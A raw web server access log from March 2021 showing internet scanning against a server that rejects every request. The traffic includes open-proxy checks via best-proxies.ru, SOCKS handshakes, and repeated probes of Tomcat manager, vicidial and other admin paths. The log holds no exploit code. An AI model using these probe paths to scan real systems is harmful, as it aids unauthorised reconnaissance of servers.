85.119.151.250 - - [27/Mar/2021:10:35:17 +0000] "\x05\x01\x00" 400 157 "-" "-"
185.173.35.1 - - [27/Mar/2021:10:41:02 +0000] "GET / HTTP/1.1" 404 2601 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
85.119.151.252 - - [27/Mar/2021:10:48:01 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBKOVJVOMJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
85.119.151.251 - - [27/Mar/2021:10:48:06 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [27/Mar/2021:10:48:11 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.250 - - [27/Mar/2021:10:48:16 +0000] "\x05\x01\x00" 400 157 "-" "-"
205.185.122.102 - - [27/Mar/2021:10:57:00 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [27/Mar/2021:11:10:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
184.105.247.254 - - [27/Mar/2021:11:42:36 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
209.141.62.143 - - [27/Mar/2021:12:15:57 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [27/Mar/2021:12:27:36 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [27/Mar/2021:13:27:42 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXIUIUYROJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.254 - - [27/Mar/2021:13:27:47 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [27/Mar/2021:13:27:52 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [27/Mar/2021:13:27:57 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.253 - - [27/Mar/2021:13:35:48 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNIBKEIOOJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
85.119.151.251 - - [27/Mar/2021:13:35:52 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [27/Mar/2021:13:35:57 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [27/Mar/2021:13:36:02 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [27/Mar/2021:14:22:34 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
45.148.10.45 - - [27/Mar/2021:14:28:18 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
192.241.219.186 - - [27/Mar/2021:14:35:54 +0000] "GET /hudson HTTP/1.1" 404 1049 "-" "Mozilla/5.0 zgrab/0.x"
45.133.9.82 - - [27/Mar/2021:15:11:16 +0000] "GET http://www.sbjudge3.com/azenv.php HTTP/1.1" 404 2646 "-" "-"
45.133.9.82 - - [27/Mar/2021:15:11:21 +0000] "CONNECT ident.me:443 HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [27/Mar/2021:16:08:19 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [27/Mar/2021:16:18:37 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.251 - - [27/Mar/2021:16:19:10 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNKJNENRYJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
85.119.151.250 - - [27/Mar/2021:16:19:15 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [27/Mar/2021:16:19:20 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.254 - - [27/Mar/2021:16:19:25 +0000] "\x05\x01\x00" 400 157 "-" "-"
162.142.125.53 - - [27/Mar/2021:16:29:04 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.53 - - [27/Mar/2021:16:29:05 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
85.119.151.250 - - [27/Mar/2021:16:31:11 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOPUVNYOYJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
85.119.151.250 - - [27/Mar/2021:16:31:16 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.253 - - [27/Mar/2021:16:31:21 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [27/Mar/2021:16:31:26 +0000] "\x05\x01\x00" 400 157 "-" "-"
162.142.125.53 - - [27/Mar/2021:17:00:36 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.53 - - [27/Mar/2021:17:00:37 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.62.143 - - [27/Mar/2021:17:34:59 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
64.225.126.37 - - [27/Mar/2021:18:05:42 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
64.225.126.37 - - [27/Mar/2021:18:05:42 +0000] "GET /favicon.ico HTTP/1.1" 404 1052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
52.249.249.127 - - [27/Mar/2021:18:11:39 +0000] "GET http://www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 400 233 "-" "python-requests/2.21.0"
52.249.249.127 - - [27/Mar/2021:18:12:56 +0000] "\x04\x01\x00P\xACC\xD3E\x00" 400 157 "-" "-"
52.249.249.127 - - [27/Mar/2021:18:12:56 +0000] "\x05\x01\x00" 400 157 "-" "-"
89.40.73.216 - - [27/Mar/2021:18:24:23 +0000] "\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`_x\xE1\xE1\x18U\x00\xC6\x0B\x86\xFF\xFC\xE3&58\xC6\xCC\xD2\x02jt\xD2\xA1\xD8\xB3\xBD\x1C\xED\x8Cz\x00\x004\xC0(\xC0'\xC0\x14\xC0\x13\x00\x9F\x00\x9E\x00\x9D\x00\x9C\xC0,\xC0+\xC0$\xC0#\xC0" 400 157 "-" "-"
209.141.62.143 - - [27/Mar/2021:19:19:33 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.131 - - [27/Mar/2021:19:26:08 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUNNKUIDKJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"
109.234.153.134 - - [27/Mar/2021:19:26:13 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [27/Mar/2021:19:26:18 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.134 - - [27/Mar/2021:19:26:23 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.130 - - [27/Mar/2021:19:38:44 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIXPONDKJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
109.234.153.131 - - [27/Mar/2021:19:38:49 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [27/Mar/2021:19:38:54 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.134 - - [27/Mar/2021:19:38:59 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.56.172 - - [27/Mar/2021:20:12:31 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.127.244 - - [27/Mar/2021:20:43:38 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [27/Mar/2021:20:48:21 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
52.249.249.127 - - [27/Mar/2021:20:49:04 +0000] "CONNECT www.crunchyroll.com:443 HTTP/1.0" 400 157 "-" "-"
139.162.111.98 - - [27/Mar/2021:20:50:26 +0000] "GET / HTTP/1.1" 404 2601 "-" "HTTP Banner Detection (https://security.ipip.net)"
209.141.62.143 - - [27/Mar/2021:21:40:28 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [27/Mar/2021:22:28:08 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [27/Mar/2021:22:33:00 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEKXNNPEUJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
109.234.153.131 - - [27/Mar/2021:22:33:04 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.132 - - [27/Mar/2021:22:33:10 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [27/Mar/2021:22:33:15 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.49.42 - - [27/Mar/2021:22:35:45 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [27/Mar/2021:22:46:53 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXOUTRTBUJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
109.234.153.131 - - [27/Mar/2021:22:46:58 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.133 - - [27/Mar/2021:22:47:02 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.130 - - [27/Mar/2021:22:47:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
23.95.222.129 - - [27/Mar/2021:23:10:10 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03\xA7\x87\xE3X\xAF\x16\x81\xA0\xF5\xA6\xD5'\x1Fx\xAE\x0F\xD5\x14\x9F\x80\x1C@\xC6\x84z\x94Y&\xB2/\x22\xBD\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
209.141.62.143 - - [27/Mar/2021:23:25:59 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
180.149.125.170 - - [27/Mar/2021:23:50:16 +0000] "GET /c/ HTTP/1.1" 404 1045 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
209.141.56.172 - - [27/Mar/2021:23:56:15 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
92.118.160.33 - - [28/Mar/2021:01:12:31 +0000] "GET / HTTP/1.0" 404 2599 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
109.234.153.130 - - [28/Mar/2021:01:22:16 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEKXODOENJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
109.234.153.131 - - [28/Mar/2021:01:22:21 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:01:22:26 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:01:22:31 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:01:25:42 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:01:30:03 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOPUTIVBNJYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
109.234.153.131 - - [28/Mar/2021:01:30:08 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:01:30:13 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:01:30:18 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.17.97.34 - - [28/Mar/2021:02:00:04 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
172.104.26.242 - - [28/Mar/2021:03:04:46 +0000] "GET / HTTP/1.0" 404 2599 "-" "-"
209.141.62.143 - - [28/Mar/2021:03:06:48 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [28/Mar/2021:03:49:47 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:04:31:53 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXPUTRNBVXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
109.234.153.131 - - [28/Mar/2021:04:31:58 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:04:32:03 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:04:32:09 +0000] "\x05\x01\x00" 400 157 "-" "-"
180.149.125.170 - - [28/Mar/2021:04:32:10 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
209.141.62.143 - - [28/Mar/2021:04:34:01 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:04:40:03 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIPDTIMUVXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
109.234.153.131 - - [28/Mar/2021:04:40:08 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:04:40:13 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:04:40:19 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.17.96.106 - - [28/Mar/2021:05:39:40 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
185.216.140.6 - - [28/Mar/2021:05:52:01 +0000] "\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03\x86YM::\x9D\xDDk\xA6\x16\xF0~'\x1E\x82\xD2\x0C\xCE\x81\xD5\xF6/8~\xC5?\xA9~\xA3Y[\xBD\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
185.216.140.6 - - [28/Mar/2021:05:52:29 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 zgrab/0.x"
209.141.62.143 - - [28/Mar/2021:06:05:47 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
193.118.53.210 - - [28/Mar/2021:06:06:43 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.56.172 - - [28/Mar/2021:07:37:59 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:07:50:04 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUONPIUNIXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
109.234.153.130 - - [28/Mar/2021:07:50:09 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:07:50:14 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:07:50:19 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:07:56:33 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPJKNTXIJIXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
109.234.153.130 - - [28/Mar/2021:07:56:38 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:07:56:43 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:07:56:48 +0000] "\x05\x01\x00" 400 157 "-" "-"
193.46.254.171 - - [28/Mar/2021:08:07:58 +0000] "GET /vicidial/admin.php?ADD=140000000000 HTTP/1.1" 404 2690 "-" "-"
209.141.62.143 - - [28/Mar/2021:08:15:17 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:09:00:05 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:09:48:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
152.67.42.78 - - [28/Mar/2021:10:39:46 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:10:42:30 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
172.104.242.173 - - [28/Mar/2021:11:26:02 +0000] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:11:46:54 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXIDPRVOPXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
109.234.153.132 - - [28/Mar/2021:11:46:58 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:11:47:04 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:11:47:09 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:11:50:47 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPJPBKETOPXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
109.234.153.134 - - [28/Mar/2021:11:50:52 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.130 - - [28/Mar/2021:11:50:57 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:11:51:02 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:12:33:29 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
128.14.133.58 - - [28/Mar/2021:13:38:37 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.62.143 - - [28/Mar/2021:14:13:07 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:14:42:03 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBIBTOOOMXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
109.234.153.132 - - [28/Mar/2021:14:42:08 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:14:42:13 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:14:42:18 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:14:42:28 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPINUKEOOMXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
109.234.153.132 - - [28/Mar/2021:14:42:33 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:14:42:38 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.131 - - [28/Mar/2021:14:42:43 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:15:40:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
139.162.111.98 - - [28/Mar/2021:15:55:06 +0000] "GET / HTTP/1.1" 404 2601 "-" "HTTP Banner Detection (https://security.ipip.net)"
65.49.20.67 - - [28/Mar/2021:16:04:15 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
193.46.254.25 - - [28/Mar/2021:17:08:57 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
209.141.62.143 - - [28/Mar/2021:17:11:29 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:17:46:34 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIIIPXODOXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
109.234.153.132 - - [28/Mar/2021:17:46:39 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:17:46:44 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:17:46:49 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.134 - - [28/Mar/2021:17:53:24 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXKEPIVEOXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
109.234.153.132 - - [28/Mar/2021:17:53:28 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.132 - - [28/Mar/2021:17:53:33 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [28/Mar/2021:17:53:38 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:18:26:33 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
185.232.69.2 - - [28/Mar/2021:18:33:26 +0000] "GET /tree? HTTP/1.1" 404 1048 "-" "Mozilla/5.0 zgrab/0.x"
209.17.97.2 - - [28/Mar/2021:18:52:23 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [28/Mar/2021:19:07:47 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:19:51:46 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
23.95.222.129 - - [28/Mar/2021:20:36:23 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03\xB1#`>|\x1C\xFE4\x5C@*\xC7L\x10\xC7U4b\xD4\xD6\xE2B\x06k\xC5ar\x9FP\x13\x1Bi\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
